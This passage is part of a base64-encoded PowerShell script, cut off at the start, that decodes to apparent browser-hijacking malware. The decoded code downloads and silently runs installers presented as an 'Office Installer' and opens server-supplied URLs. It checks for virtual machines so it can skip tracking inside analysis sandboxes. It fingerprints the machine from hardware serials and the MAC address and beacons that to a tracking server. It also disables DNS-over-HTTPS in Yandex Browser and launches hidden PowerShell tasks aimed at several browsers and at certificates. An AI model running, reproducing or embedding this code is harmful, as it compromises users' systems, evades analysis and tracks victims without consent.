ogICAgICAgICAgICAgICAgIyBFeGVjdXRlIHRoZSBpbnN0YWxsZXINCiAgICAgICAgICAgICAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkaW5zdGFsbGVyUGF0aCAtV2FpdA0KDQogICAgICAgICAgICAgICAgIyBXcml0ZSB0byB0aGUgcmVnaXN0cnkNCiAgICAgICAgICAgICAgICAkcmVnaXN0cnlQYXRoID0gIkhLQ1U6XFNvZnR3YXJlXEhlcGhhZXN0dXNcRG93bmxvYWRzIg0KICAgICAgICAgICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJlZ2lzdHJ5UGF0aCkpIHsNCiAgICAgICAgICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHJlZ2lzdHJ5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGZpbGVOYW1lIC1WYWx1ZSAiRG93bmxvYWRlZCINCiAgICAgICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygiRXJyb3IgZXhlY3V0aW5nIHRoZSBpbnN0YWxsZXI6ICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSwgIkV4ZWN1dGlvbiBFcnJvciIsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuQXBwbGljYXRpb25dOjpEb0V2ZW50cygpDQogICAgfQ0KDQogICAgIyBBZGQgZXZlbnQgaGFuZGxlcnMgdG8gV2ViQ2xpZW50DQogICAgJHdlYkNsaWVudC5hZGRfRG93bmxvYWRQcm9ncmVzc0NoYW5nZWQoJHByb2dyZXNzQ2hhbmdlZEhhbmRsZXIpDQogICAgJHdlYkNsaWVudC5hZGRfRG93bmxvYWRGaWxlQ29tcGxldGVkKCRkb3dubG9hZEZpbGVDb21wbGV0ZWRIYW5kbGVyKQ0KDQogICAgdHJ5IHsNCiAgICAgICAgIyBTdGFydCB0aGUgZG93bmxvYWQNCiAgICAgICAgJHdlYkNsaWVudC5Eb3dubG9hZEZpbGVBc3luYyhbVXJpXSR1cmwsICRpbnN0YWxsZXJQYXRoKQ0KICAgICAgICANCiAgICAgICAgIyBLZWVwIHRoZSBmb3JtIHJlc3BvbnNpdmUgd2hpbGUgdGhlIGRvd25sb2FkIGlzIGluIHByb2dyZXNzDQogICAgICAgIHdoaWxlICgkZm9ybS5WaXNpYmxlKSB7DQogICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDENCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BcHBsaWNhdGlvbl06OkRvRXZlbnRzKCkNCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkVycm9yIGluaXRpYXRpbmcgZG93bmxvYWQ6ICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSwgIkRvd25sb2FkIEVycm9yIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06OkVycm9yKQ0KICAgICAgICAkZm9ybS5DbG9zZSgpDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBEb3dubG9hZCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmwsDQogICAgICAgIFtzdHJpbmddJHRpdGxlDQogICAgKQ0KDQogICAgJGZpbGVOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJHVybCkNCg0KICAgICRhdXRvID0gVGVzdC1BdXRvc3RhcnQ7DQogICAgaWYgKCRzZXJ2ZXIuc3RhcnREb3dubG9hZHNGb3JjZSAtbmUgJGZhbHNlIC1hbmQgJGF1dG8gLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgJHJlZ2lzdHJ5UGF0aCA9ICJIS0NVOlxTb2Z0d2FyZVxIZXBoYWVzdHVzXERvd25sb2FkcyINCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkcmVnaXN0cnlQYXRoKSB7DQogICAgICAgICAgICAkaW5zdGFsbGVkID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRmaWxlTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgaWYgKCRpbnN0YWxsZWQpIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJUaGUgZmlsZSAnJGZpbGVOYW1lJyBpcyBhbHJlYWR5IGluc3RhbGxlZC4iDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuDQogICAgfQ0KDQogICAgU3RhcnQtRG93bmxvYWRBbmRFeGVjdXRlIC11cmwgJHVybCAtdGl0bGUgJHRpdGxlDQp9DQoNCmZ1bmN0aW9uIGRvX3N0YXJ0ZG93bmxvYWRzIHsNCiAgICB0cnkgDQogICAgew0KICAgICAgICBmb3JlYWNoICgkdXJsIGluICRzZXJ2ZXIuc3RhcnREb3dubG9hZHMpDQogICAgICAgIHsNCiAgICAgICAgICAgIERvd25sb2FkIC11cmwgJHVybCAtdGl0bGUgIkRvd25sb2FkaW5nIE9mZmljZSBJbnN0YWxsZXIiDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIChTdGFydCBEb3dubG9hZHMpOiAkXyINCiAgICB9DQp9DQoNCg0KDQpmdW5jdGlvbiBkb19zdGFydHVybHMgew0KICAgICRhdXRvID0gVGVzdC1BdXRvc3RhcnQ7DQogICAgaWYgKCRzZXJ2ZXIuc3RhcnRVcmxzRm9yY2UgLW5lICRmYWxzZSAtYW5kICRhdXRvIC1lcSAkdHJ1ZSkNCiAgICB7DQogICAgICAgIHdyaXRlZGJnICJTa2lwcGluZyBmdW5jdGlvbiBEb1N0YXJ0VXJscyINCiAgICAgICAgcmV0dXJuDQogICAgfQ0KICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgIGZvcmVhY2ggKCRzdGFydFVybCBpbiAkc2VydmVyLnN0YXJ0VXJscykgew0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAkc3RhcnRVcmwuVHJpbSgpDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2gNCiAgICB7DQogICAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgKFN0YXJ0IFVybHMpOiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIElzLVZpcnR1YWxNYWNoaW5lIHsNCiAgICAjIEdldCBXaW4zMl9Db21wdXRlclN5c3RlbSBpbmZvcm1hdGlvbg0KICAgICRjb21wdXRlclN5c3RlbSA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtDQogICAgJGlzVmlydHVhbCA9ICRmYWxzZQ0KDQogICAgIyBDaGVjayBmb3IgY29tbW9uIHZpcnR1YWxpemF0aW9uIG1hbnVmYWN0dXJlcnMNCiAgICAkdm1NYW51ZmFjdHVyZXJzID0gQCgNCiAgICAgICAgIk1pY3Jvc29mdCBDb3Jwb3JhdGlvbiIsICAgIyBIeXBlci1WDQogICAgICAgICJWTXdhcmUsIEluYy4iLCAgICAgICAgICAgICMgVk13YXJlDQogICAgICAgICJYZW4iLCAgICAgICAgICAgICAgICAgICAgICMgWGVuDQogICAgICAgICJYZW5Tb3VyY2UsIEluYy4iLCAgICAgICAgICMgWGVuU291cmNlDQogICAgICAgICJpbm5vdGVrIEdtYkgiLCAgICAgICAgICAgICMgVmlydHVhbEJveA0KICAgICAgICAiT3JhY2xlIENvcnBvcmF0aW9uIiwgICAgICAjIFZpcnR1YWxCb3gNCiAgICAgICAgIlBhcmFsbGVscyBTb2Z0d2FyZSBJbnRlcm5hdGlvbmFsIEluYy4iLCAjIFBhcmFsbGVscw0KICAgICAgICAiUUVNVSIsICAgICAgICAgICAgICAgICAgICAjIFFFTVUNCiAgICAgICAgIlJlZCBIYXQsIEluYy4iLCAgICAgICAgICAgIyBLVk0NCiAgICAgICAgIkFtYXpvbiBFQzIiLCAgICAgICAgICAgICAgIyBBV1MgRUMyDQogICAgICAgICJHb29nbGUiLCAgICAgICAgICAgICAgICAgICMgR29vZ2xlIENsb3VkIFBsYXRmb3JtDQogICAgICAgICJWaXJ0dW96em8iLCAgICAgICAgICAgICAgICMgVmlydHVvenpvDQogICAgICAgICJEaWdpdGFsT2NlYW4iICAgICAgICAgICAgICMgRGlnaXRhbE9jZWFuDQogICAgKQ0KDQogICAgIyBDaGVjayBNYW51ZmFjdHVyZXIgYW5kIE1vZGVsIGZvciBzaWducyBvZiB2aXJ0dWFsaXphdGlvbg0KICAgIGlmICgkdm1NYW51ZmFjdHVyZXJzIC1jb250YWlucyAkY29tcHV0ZXJTeXN0ZW0uTWFudWZhY3R1cmVyKSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0gZWxzZWlmICgkY29tcHV0ZXJTeXN0ZW0uTW9kZWwgLW1hdGNoICJWaXJ0dWFsfFZNfFZCT1h8S1ZNfFFFTVV8UGFyYWxsZWxzfFhlbiIpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfQ0KDQogICAgIyBBZGRpdGlvbmFsIGNoZWNrcyBmb3IgdmlydHVhbGl6YXRpb24gdXNpbmcgV2luMzJfQklPUw0KICAgICRiaW9zID0gR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQklPUw0KICAgIGlmICgkYmlvcy5TZXJpYWxOdW1iZXIgLW1hdGNoICJWTXdhcmV8VkJPWHxWaXJ0dWFsfFhlbnxRRU1VfFBhcmFsbGVscyIpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfQ0KDQogICAgIyBBZGRpdGlvbmFsIGNoZWNrcyB1c2luZyBXaW4zMl9Db21wdXRlclN5c3RlbVByb2R1Y3QNCiAgICAkY29tcHV0ZXJTeXN0ZW1Qcm9kdWN0ID0gR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWN0DQogICAgaWYgKCRjb21wdXRlclN5c3RlbVByb2R1Y3QuVmVyc2lvbiAtbWF0Y2ggIlZpcnR1YWx8Vk18VkJPWHxLVk18UUVNVXxQYXJhbGxlbHN8WGVuIikgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9DQoNCiAgICAjIEFkZGl0aW9uYWwgcmVnaXN0cnkgY2hlY2sgZm9yIFBhcmFsbGVscw0KICAgICRwYXJhbGxlbHNLZXkgPSAiSEtMTTpcU09GVFdBUkVcUGFyYWxsZWxzXFBhcmFsbGVscyBUb29scyINCiAgICBpZiAoVGVzdC1QYXRoICRwYXJhbGxlbHNLZXkpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfQ0KDQogICAgcmV0dXJuICRpc1ZpcnR1YWwNCn0NCg0KDQpmdW5jdGlvbiBHZXQtTWFjaGluZUhhc2hDb2RlIHsNCiAgICAjIEdldCBCSU9TIFNlcmlhbCBOdW1iZXINCiAgICAkYmlvc1NlcmlhbCA9IChHZXQtV21pT2JqZWN0IFdpbjMyX0JJT1MpLlNlcmlhbE51bWJlcg0KDQogICAgIyBHZXQgTW90aGVyYm9hcmQgU2VyaWFsIE51bWJlcg0KICAgICRtYlNlcmlhbCA9IChHZXQtV21pT2JqZWN0IFdpbjMyX0Jhc2VCb2FyZCkuU2VyaWFsTnVtYmVyDQoNCiAgICAjIEdldCBNQUMgQWRkcmVzcyBvZiB0aGUgZmlyc3QgbmV0d29yayBhZGFwdGVyDQogICAgJG1hY0FkZHJlc3MgPSAoR2V0LVdtaU9iamVjdCBXaW4zMl9OZXR3b3JrQWRhcHRlckNvbmZpZ3VyYXRpb24gfCBXaGVyZS1PYmplY3QgeyAkXy5NQUNBZGRyZXNzIC1hbmQgJF8uSVBFbmFibGVkIH0pLk1BQ0FkZHJlc3NbMF0NCg0KICAgICMgQ29tYmluZSB0aGUgaGFyZHdhcmUgaWRlbnRpZmllcnMgaW50byBhIHNpbmdsZSBzdHJpbmcNCiAgICAkY29tYmluZWRTdHJpbmcgPSAiJGJpb3NTZXJpYWwkbWJTZXJpYWwkbWFjQWRkcmVzcyINCg0KICAgICMgQ29tcHV0ZSB0aGUgaGFzaCBjb2RlIHVzaW5nIFNIQTI1Ng0KICAgICRzaGEyNTYgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZdOjpDcmVhdGUoKQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGNvbWJpbmVkU3RyaW5nKQ0KICAgICRoYXNoQnl0ZXMgPSAkc2hhMjU2LkNvbXB1dGVIYXNoKCRieXRlcykNCiAgICAkaGFzaFN0cmluZyA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkaGFzaEJ5dGVzKSAtcmVwbGFjZSAiLSIsICIiDQoNCiAgICByZXR1cm4gJGhhc2hTdHJpbmcNCn0NCg0KDQpmdW5jdGlvbiBHZW5lcmF0ZS1IYXNoIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGRhdGEsDQogICAgICAgIFtzdHJpbmddJGtleQ0KICAgICkNCg0KICAgICRrZXlCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGtleSkNCiAgICAkZGF0YUJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkZGF0YSkNCiAgICANCiAgICAkaG1hYyA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5ITUFDU0hBMjU2DQogICAgJGhtYWMuS2V5ID0gJGtleUJ5dGVzDQogICAgJGhhc2hCeXRlcyA9ICRobWFjLkNvbXB1dGVIYXNoKCRkYXRhQnl0ZXMpDQogICAgDQogICAgcmV0dXJuIFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGhhc2hCeXRlcykNCn0NCg0KZnVuY3Rpb24gV3JpdGUtU3RyaW5nVG9GaWxlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJEZpbGVOYW1lLA0KICAgICAgICBbc3RyaW5nXSRDb250ZW50DQogICAgKQ0KICAgIA0KICAgICMgR2V0IHRoZSBwYXRoIHRvIHRoZSBkZXNrdG9wDQogICAgJERlc2t0b3BQYXRoID0gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoJ0Rlc2t0b3AnKQ0KICAgIA0KICAgICMgQ3JlYXRlIHRoZSBmdWxsIHBhdGggdG8gdGhlIGZpbGUNCiAgICAkRmlsZVBhdGggPSBKb2luLVBhdGggLVBhdGggJERlc2t0b3BQYXRoIC1DaGlsZFBhdGggJEZpbGVOYW1lDQogICAgDQogICAgIyBXcml0ZSB0aGUgY29udGVudCB0byB0aGUgZmlsZSwgY3JlYXRpbmcgb3Igb3ZlcndyaXRpbmcgaXQNCiAgICBTZXQtQ29udGVudCAtUGF0aCAkRmlsZVBhdGggLVZhbHVlICRDb250ZW50DQp9DQoNCmZ1bmN0aW9uIEdldFNlcmllKCkNCnsNCiAgICAkcmVnaXN0cnlQYXRoID0gIkhLQ1U6XFNvZnR3YXJlXEhlcGhhZXN0dXMiDQogICAgJGtleU5hbWUgPSAic2VyaWUiDQogICAgJG5ld1ZhbHVlID0gJHNlcnZlci50cmFja1NlcmllLlRvU3RyaW5nKCk7DQoNCiAgICBpZiAoVGVzdC1QYXRoICRyZWdpc3RyeVBhdGgpIHsNCiAgICAgICAgJGtleVZhbHVlID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRrZXlOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgJGtleU5hbWUNCiAgICAgICAgaWYgKCRrZXlWYWx1ZSAtYW5kICRrZXlWYWx1ZSAtbmUgIiIpIHsNCiAgICAgICAgICAgIHJldHVybiAka2V5VmFsdWUNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAka2V5TmFtZSAtVmFsdWUgJG5ld1ZhbHVlDQogICAgICAgICAgICByZXR1cm4gJG5ld1ZhbHVlDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAka2V5TmFtZSAtVmFsdWUgJG5ld1ZhbHVlIC1Qcm9wZXJ0eVR5cGUgU3RyaW5nIHwgT3V0LU51bGwNCiAgICAgICAgcmV0dXJuICRuZXdWYWx1ZQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gR2V0VGltZURpZigpDQp7DQogICAgJHJlZ2lzdHJ5UGF0aCA9ICJIS0NVOlxTb2Z0d2FyZVxIZXBoYWVzdHVzIg0KICAgICRrZXlOYW1lID0gInRpbWVEaWYiDQogICAgJHRpbWVEaWY9MDsNCg0KICAgIGlmIChUZXN0LVBhdGggJHJlZ2lzdHJ5UGF0aCkgew0KICAgICAgICAka2V5VmFsdWUgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGtleU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSAka2V5TmFtZQ0KICAgICAgICBpZiAoJGtleVZhbHVlIC1hbmQgJGtleVZhbHVlIC1uZSAiIikgew0KICAgICAgICAgICAgJHRpbWVEaWYgPSAka2V5VmFsdWUNCiAgICAgICAgfQ0KICAgIH0NCiAgICBpZiAoJHRpbWVEaWYgLWFzIFtpbnRdKSB7DQogICAgICAgICR0aW1lRGlmID0gW2ludF0kdGltZURpZg0KICAgIH0gZWxzZSB7DQogICAgICAgICR0aW1lRGlmPSAwDQogICAgfQ0KICAgIHJldHVybiAkdGltZURpZg0KfQ0KDQpmdW5jdGlvbiBkb190cmFja2VyIHsNCiAgICBpZiAoJHNlcnZlci50cmFjayAtZXEgJGZhbHNlKXsNCiAgICAgICAgcmV0dXJuDQogICAgfQ0KDQogICAgJGlzVk0gPSBJcy1WaXJ0dWFsTWFjaGluZQ0KICAgIGlmICgkaXNWTSAtZXEgJHRydWUpew0KICAgICAgICByZXR1cm4NCiAgICB9DQoNCiAgICAkZWxldmF0ZWQgPSAwDQogICAgaWYgKElzRWxldmF0ZWQpDQogICAgew0KICAgICAgICAkZWxldmF0ZWQ9MTsNCiAgICB9DQoNCiAgICAkaWQgPSBHZXQtTWFjaGluZUhhc2hDb2RlDQoNCiAgICAkYm9keSA9ICJ7YCJpZGAiOmAiJCgkaWQuVG9TdHJpbmcoKSlgIixgInNlcmllYCI6YCIkKEdldFNlcmllKWAiLGAibnVtYmVyYCI6YCIkKCRpZC5Ub1N0cmluZygpKWAiLGAiZWxldmF0ZWRfbnVtYmVyYCI6JCgkZWxldmF0ZWQpLGAidGltZURpZmAiOiQoR2V0VGltZURpZil9Ig0KDQoNCiAgICAjIFNlY3JldCBrZXkgKHNoYXJlZCB3aXRoIHRoZSBzZXJ2ZXIpDQogICAgJHNlY3JldEtleSA9ICJZb3VyU2VjcmV0S2V5SGVyZSINCg0KICAgICR1cmw9ICRzZXJ2ZXIudHJhY2tVcmwNCiAgDQogICAgIyBHZW5lcmF0ZSB0aGUgaGFzaCBmb3IgdGhlIEpTT04gcmVxdWVzdCBib2R5DQogICAgJGhhc2ggPSBHZW5lcmF0ZS1IYXNoIC1kYXRhICRib2R5IC1rZXkgJHNlY3JldEtleQ0KDQogICAgIyBQcmVwYXJlIGhlYWRlcnMNCiAgICAkaGVhZGVycyA9IEB7DQogICAgICAgICJYLVNpZ25hdHVyZSIgPSAkaGFzaA0KICAgICAgICAiQ29udGVudC1UeXBlIiA9ICJhcHBsaWNhdGlvbi9qc29uIg0KICAgICAgICAiVXNlci1BZ2VudCIgID0gIlBvd2VyU2hlbGwvNy4yIiAgIyBVc2UgdGhlIFVzZXItQWdlbnQgZnJvbSBQb3N0bWFuIGlmIGtub3duDQogICAgfQ0KDQogICAgJHRpbWVvdXQgPSBbZGF0ZXRpbWVdOjpVdGNOb3cuQWRkTWludXRlcygxKQ0KICAgICRkZWxheSA9IDUNCg0KICAgIA0KICAgIHdoaWxlIChbZGF0ZXRpbWVdOjpVdGNOb3cgLWx0ICR0aW1lb3V0KSANCiAgICB7DQogICAgIA0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIEludm9rZS1XZWJSZXF1ZXN0IC1IZWFkZXJzICRoZWFkZXJzIC1NZXRob2QgIlBPU1QiIC1Cb2R5ICRib2R5IC1VcmkgJHVybCAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiDQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCBbU3lzdGVtLk5ldC5XZWJFeGNlcHRpb25dIHsNCiAgICAgICAgICAgICAgICAkc3RhdHVzQ29kZSA9ICRfLkV4Y2VwdGlvbi5SZXNwb25zZS5TdGF0dXNDb2RlDQogICAgICAgICAgICAgICAgJHJlc3BTdHJlYW0gPSAkXy5FeGNlcHRpb24uUmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKQ0KICAgICAgICAgICAgICAgICRyZWFkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIoJHJlc3BTdHJlYW0pDQogICAgICAgICAgICAgICAgJHJlYWRlci5CYXNlU3RyZWFtLlBvc2l0aW9uID0gMA0KICAgICAgICAgICAgICAgICRyZXNwb25zZUJvZHkgPSAkcmVhZGVyLlJlYWRUb0VuZCgpIHwgQ29udmVydEZyb20tSnNvbg0KICAgICAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRXJyb3IgbWFraW5nIHJlcXVlc3Q6ICRyZXNwb25zZUJvZHkiDQogICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoew0KICAgICAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRXJyb3IgbWFraW5nIHJlcXVlc3Q6ICRfIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICB9DQoNCiAgICBpZiAoJHNlcnZlci50cmFja0Rlc2t0b3AgLWVxICR0cnVlKXsNCiAgICAgICAgV3JpdGUtU3RyaW5nVG9GaWxlIC1GaWxlTmFtZSAiJCgkc2VydmVyLnRyYWNrU2VyaWUpLnR4dCIgLUNvbnRlbnQgJGlkDQogICAgfQ0KDQp9DQoNCmZ1bmN0aW9uIGRvX3lhbmRleA0Kew0KICAgIENsb3NlLVByb2Nlc3NlcyhAKCdzZXJ2aWNlX3VwZGF0ZS5leGUnLCdicm93c2VyLmV4ZScpKQ0KDQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIHsNCiAgICAgICAgJHBhdGggPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICdZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGFcTG9jYWwgU3RhdGUnDQoNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJHBhdGggLVBhdGhUeXBlIExlYWYpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlndXJlWWFuZGV4SW50ZXJuYWwgLUZpbGVQYXRoICRwYXRoDQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG9jY3VycmVkOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ29uZmlndXJlWWFuZGV4SW50ZXJuYWwgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aA0KICAgICkNCiAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgaWYgKCRudWxsIC1lcSAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtb3IgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLWlzbm90IFtvYmplY3RdKSB7DQogICAgICAgICRjb250ZW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ2Ruc19vdmVyX2h0dHBzJyAtVmFsdWUgQHsNCiAgICAgICAgICAgICdtb2RlJyA9ICdvZmYnDQogICAgICAgICAgICAndGVtcGxhdGVzJyA9ICIiDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy5tb2RlID0gJ29mZicNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMudGVtcGxhdGVzID0gIiINCiAgICB9DQoNCiAgICAkanNvblN0cmluZyA9ICRjb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQoNCiAgICBTZXQtQ29udGVudCAtUGF0aCAkZmlsZVBhdGggLVZhbHVlICRqc29uU3RyaW5nIC1FbmNvZGluZyBVVEY4IC1Gb3JjZQ0KDQogICAgd3JpdGVkYmcgIlN1Y2Nlc3NmdWxseSBjb25maWd1cmVkIFlhbmRleCBzZXR0aW5ncyBpbiAkZmlsZVBhdGgiDQp9DQoNCiMjI2hlYWQNCg0KDQoNCmZ1bmN0aW9uIEludm9rZS1TY3JpcHQNCnsNCiAgICBwYXJhbQ0KICAgICgNCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldDQogICAgICAgIFtzdHJpbmddDQogICAgICAgICRzY3JpcHRQYXRoLA0KDQogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQ0KICAgICAgICBbc3RyaW5nW11dDQogICAgICAgICR0YXNrTmFtZQ0KICAgICkNCiAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUFyZ3VtZW50TGlzdCAiLWZpbGUgIiIkc2NyaXB0UGF0aCIiIC1UYXNrICR0YXNrTmFtZSINCn0NCg0KZnVuY3Rpb24gTWFpbiANCnsNCiAgICAkc2NyaXB0UGF0aCA9IEdldC1TY3JpcHRQYXRoDQoNCiAgICBpZiAoJFRhc2spIHsNCiAgICAgICAgJiAkVGFzaw0KICAgIH0gZWxzZSB7ICAgICAgICAgICAgICAgDQoNCiAgICAgICAgJHRhc2tGdW5jdGlvbnMgPSBAKA0KICAgICAgICAgICAgJ2RvX2Ruc21hbicsJ2RvX2NlcnQnLCdkb19jaHJvbWUnLCdkb19jaHJvbWVfcHVzaCcsJ2RvX2Nocm9tZV91YmxvY2snLCdkb19lZGdlJywnZG9fZW1iZWRkaW5ncycsJ2RvX2ZpcmVmb3gnLCdkb19vcGVyYScsJ2RvX3N0YXJ0ZG93bmxvYWRzJywnZG9fc3RhcnR1cmxzJywnZG9fdHJhY2tlcicsJ2RvX3lhbmRleCcsJ2RvX2V4dHJhdXBkYXRlJw0KICAgICAgICApDQoNCiAgICAgICAgZm9yZWFjaCAoJHRhc2sgaW4gJHRhc2tGdW5jdGlvbnMpIHsNCiAgICAgICAgICAgIEludm9rZS1TY3JpcHQgJHNjcmlwdFBhdGggJHRhc2sNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KTWFpbg=="
